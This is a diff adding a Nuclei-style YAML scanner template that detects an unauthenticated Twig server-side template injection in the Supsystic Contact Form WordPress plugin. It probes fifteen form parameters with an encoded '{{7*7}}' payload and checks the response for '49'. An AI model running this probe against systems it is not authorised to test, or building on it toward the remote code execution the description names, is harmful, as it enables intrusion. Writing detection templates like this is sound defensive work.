@@ -1,0 +1,53 @@
+id: supsystic-contact-form-ssti
+info:
+  name: WordPress Contact Form by Supsystic <=1.7.36 - Unauthenticated SSTI
+  author: bootstrapbool
+  severity: critical
+  description: |
+    WordPress Plugin Contact Form by Supsystic <= 1.7.36 is vulnerable to
+    unauthenticated server-side template injection via the cfsPreFill parameter.
+    Form field values are passed directly into an unsandboxed Twig template engine
+    without sanitization, allowing unauthenticated attackers to execute arbitrary
+    code remotely.
+  reference:
+    - https://www.exploit-db.com/exploits/52564
+  classification:
+    cwe-id: CWE-94
+  metadata:
+    max-request: 15
+    vendor: supsystic
+    product: contact-form-by-supsystic
+    fofa-query: body="contact-form-by-supsystic"
+  tags: cve,cve2026,wordpress,wp-plugin,ssti,supsystic,unauth
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cfsPreFill=1&email=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&first_name=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&last_name=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&subject=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&message=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&name=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&phone=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&company=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&website=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&comment=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&address=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&city=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&country=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&zip=%7B%7B7*7%7D%7D"
+      - "{{BaseURL}}/?cfsPreFill=1&text=%7B%7B7*7%7D%7D"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'value="49"'
+      - type: word
+        part: body
+        words:
+          - "contact-form-by-supsystic"
+      - type: status
+        status:
+          - 200
